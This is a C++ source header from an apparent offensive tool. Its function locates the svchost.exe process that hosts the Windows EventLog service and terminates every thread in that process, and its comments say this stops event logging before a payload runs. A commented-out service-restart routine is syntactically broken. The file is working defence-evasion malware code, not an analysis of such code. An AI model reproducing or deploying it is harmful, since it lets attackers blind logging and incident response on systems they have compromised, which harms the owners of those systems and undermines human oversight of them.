#pragma once

#include <stdio.h>
#include <TlHelp32.h>
#include "Init.h"

// From: https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot
//#define TH32CS_SNAPTHREAD 0x00000004

//using ReadProcessMemoryPrototype = BOOL(WINAPI*)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T);
//ReadProcessMemoryPrototype ReadProcessMemory = (ReadProcessMemoryPrototype)GetProcAddress(GetModuleHandleA(kernel32), sReadProcessMemory);

//using IsWow64ProcessPrototype = BOOL(WINAPI*)(HANDLE, PBOOL);
//IsWow64ProcessPrototype IsWow64Process = (IsWow64ProcessPrototype)GetProcAddress(GetModuleHandleA(kernel32), sIsWow64Process);

//using CloseHandlePrototype = BOOL(WINAPI*)(HANDLE);
//CloseHandlePrototype CloseHandle = (CloseHandlePrototype)GetProcAddress(GetModuleHandleA(kernel32), sCloseHandle);

//using Thread32FirstPrototype = BOOL(WINAPI*)(HANDLE, LPTHREADENTRY32);
//Thread32FirstPrototype Thread32First = (Thread32FirstPrototype)GetProcAddress(GetModuleHandleA(kernel32), sThread32First);

//using Thread32NextPrototype = BOOL(WINAPI*)(HANDLE, LPTHREADENTRY32);
//Thread32NextPrototype Thread32Next = (Thread32NextPrototype)GetProcAddress(GetModuleHandleA(kernel32), sThread32Next);

//using CreateToolhelp32SnapshotPrototype = HANDLE(WINAPI*)(DWORD, DWORD);
//CreateToolhelp32SnapshotPrototype CreateToolhelp32Snapshot = (CreateToolhelp32SnapshotPrototype)GetProcAddress(GetModuleHandleA(kernel32), sCreateToolhelp32Snapshot);

//using TerminateThreadPrototype = BOOL(WINAPI*)(HANDLE, DWORD);
//TerminateThreadPrototype TerminateThread = (TerminateThreadPrototype)GetProcAddress(GetModuleHandleA(kernel32), sTerminateThread);


int KillEventLogThreads()
{
	// Grabbing a handle to Service Manager (svchost.exe) 
	SC_HANDLE hSVCM = OpenSCManagerA(".", NULL, MAXIMUM_ALLOWED);

	// Grabbing a handle to EventLog Service
	SC_HANDLE hEventLogService = OpenServiceA(hSVCM, "EventLog", MAXIMUM_ALLOWED);

	// Essentials:
	SERVICE_STATUS_PROCESS svcStatus = {};
	DWORD bytesNeeded = 0;

	// Get PID of svchost.exe that hosts EventLog service
	if (!QueryServiceStatusEx(hEventLogService, SC_STATUS_PROCESS_INFO, (LPBYTE)&svcStatus, sizeof(svcStatus), &bytesNeeded))
	{
		printf("[!] Unable to get PID of svchost.exe that hosts EventLog service (%u)\n", GetLastError());
		return -1;
	}

	DWORD hEventLogServicePID = svcStatus.dwProcessId;

	printf("\n[*] Targeting svchost.exe hosting eventlog service with PID: %d\n", (int)hEventLogServicePID);

	// Change to: NtOpenProcess after knowing the fix for "POBJECT_ATTRIBUTES ObjectAttributes" issue

	using OpenProcessPrototype = HANDLE(WINAPI*)(DWORD, BOOL, DWORD);
	OpenProcessPrototype OpenProcess = (OpenProcessPrototype)GetProcAddress(GetModuleHandleA(win32), sOpenP);

	// Getting a Handle to svchost.exe containing Eventlog Service Threads
	HANDLE hSVC = NULL;
	hSVC = OpenProcess(PROCESS_VM_READ, FALSE, hEventLogServicePID);

	if (hSVC == NULL)
	{
		printf("[!] Failed to get a handle to svchost.exe that hosts EventLog service (%u)\n", GetLastError());
		return -1;
	}

	// End: Change to: NtOpenProcess after knowing the fix for "POBJECT_ATTRIBUTES ObjectAttributes" issue

	// EventLog Thread Kill Count
	int killcount = 0;

	// Get SnapShot of all threads
	HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
	THREADENTRY32 te32;
	THREAD_BASIC_INFORMATION threadBasicInfo;
	BOOL bIsWoW64 = FALSE;
	DWORD dwOffset = NULL;
	PVOID subProcessTag = NULL;

	hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hThreadSnap == INVALID_HANDLE_VALUE)
		return -1;
	te32.dwSize = sizeof(THREADENTRY32);

	// parse the snapshot and search for threads belonging to eventlog
	if (!Thread32First(hThreadSnap, &te32))
	{
		printf("Thread32First() and we died (%u)\n", GetLastError());
		CloseHandle(hThreadSnap);
		return -1;
	}
	do
	{
		// Searching for that svchost.exe which has EventLog service Threads running
		if (te32.th32OwnerProcessID == hEventLogServicePID)
		{
			// Now open a handle those threads one by one
			HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);

			if (hThread == NULL)
			{
				printf("[!] Failed to get a handle to one of EventLog service Threads (%u)\n", GetLastError());
				return -1;
			}

			NTSTATUS status = NtQueryInformationThread(hThread, (THREAD_INFORMATION_CLASS)0, &threadBasicInfo, sizeof(threadBasicInfo), NULL);

			// Checking for 32 or 64 bits:

			// Why?

			// Cause:
			// I have to know whether this thread is "The Thread (EventLog service Thread)" or NOT

			// There is a "sub process tag" which indicates this thread being, EventLog service Thread or NOT.

			// This "sub process tag" is present in TEB, which depends upon the arch. of the running svchost.exe (parent process of those threads)!

			bIsWoW64 = IsWow64Process(hSVC, &bIsWoW64);
			if (!bIsWoW64)
			{
				// 32 bit: Credit @SEKTOR7net
				dwOffset = 0x1720;
				//printf("32 bit\n");
			}
			else
			{
				// 64 bit: Credit @SEKTOR7net
				dwOffset = 0xf60;
				//printf("64 bit\n");
			}

			// Reading sub Process Tag from TEB of svchost.exe 
			ReadProcessMemory(hSVC, ((PBYTE)threadBasicInfo.pTebBaseAddress + dwOffset), &subProcessTag, sizeof(subProcessTag), NULL);

			// Unable to Detect subProcessTag in this indirect syscall Version => Winapi version works fine!
			/*
			if (!subProcessTag)
			{
				printf("Closing Handle to %d\n", te32.th32ThreadID);
				CloseHandle(hThread);
				continue;
			}
			*/

			//printf("Got SubProcess Tag\n");

			SC_SERVICE_TAG_QUERY query = { 0 };

			if (I_QueryTagInformation)
			{
				query.processId = (ULONG)hEventLogServicePID;
				query.serviceTag = (ULONG)subProcessTag;
				query.reserved = 0;
				query.pBuffer = NULL;

				// This function translates the subProcessTag to ServiceName 
				// => eventlog
				I_QueryTagInformation(NULL, ServiceNameFromTagInformation, &query);

				printf("[+] Thread FOUND: TID -> %d", te32.th32ThreadID);

				// ========== Unable to Detect subProcessTag in this Version => Winapi version works fine! ======================
				/*
				if (_wcsicmp((wchar_t*)query.pBuffer, L"eventlog") == 0)
				{
					printf("[+] EventLog Thread FOUND: TID -> %d", te32.th32ThreadID);
					if (TerminateThread(hThread, NULL))
					{
						printf("\tTerminated!\n");// , te32.th32ThreadID);
						killcount++;
					}
					else
					{
						printf("\n[!] Unable to terminate EventLog thread (TID: %d) !\n", te32.th32ThreadID);
					}
				}
				*/

				// ========== End: Unable to Detect subProcessTag in this Version => Winapi version works fine! ======================

				// To get around this:
				// 1. Killing all threads 
				// 2. Restarting EventService Again! => Can be found, called from indirect.cpp -> main() function after Execution of payload

				// Killing all threads 
				if (TerminateThread(hThread, NULL))
				{
					printf("\tTerminated!\n");// , te32.th32ThreadID);
					killcount++;
				}
				else
				{
					printf("\n[!] Failed to terminate EventLog thread (TID: %d) !\n", te32.th32ThreadID);

				}
			}
			CloseHandle(hThread);
		}
	} while (Thread32Next(hThreadSnap, &te32));

	CloseHandle(hThreadSnap);
	CloseHandle(hSVC);

	if (killcount == 0)
	{
		printf("[+] Event Logger is Either NOT running or Already Killed Previously!\n");
	}

	return 0;
}

/*
int RestartEventLogService()
{
	// Grabbing a handle to Service Manager (svchost.exe) 
	SC_HANDLE hSVCM = OpenSCManagerA(".", NULL, MAXIMUM_ALLOWED);

	// handle to the service control manager: hSVCM
	// name of the service to install (Default): "EventLog"
	// display name (Default): "Windows Event Log"
	// access to the service : Took as MAXIMUM_ALLOWED (as while opening a handle, it was opened as MAXIMUM_ALLOWED)
	// Service Type: Written as Unknown (In my machine): Took as SERVICE_WIN32_OWN_PROCESS -> IOC spotted!
	// Default Service Start type: "Auto Start" -> applying that (SERVICE_AUTO_START)
	// Service Error Control (Default): "NORMAL" -> applying that (SERVICE_ERROR_NORMAL)
	// lpLoadOrderGroup : Can't really figure out -> taking NULL
	// lpdwTagId: taking NULL
	// Dependencies (Default -> NULL): taking NULL
	// name of the account under which the service should run: NT AUTHORITY\LocalService (As per my machine: assuming default): NULL


	SC_HANDLE hEventLogService = CreateServiceA(hSVCM, "EventLog", "Windows Event Log", MAXIMUM_ALLOWED, SERVICE_WIN32_OWN_PROCESS, 
		SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, "C:\\WINDOWS\\System32\\svchost.exe", NULL, NULL, NULL, NULL, );

	// Starting EventLog Service
	BOOL status = StartServiceA(hEventLogService, 0, NULL);

	if (!status)
	{
		return -1;
	}

	return 0;
}
*/
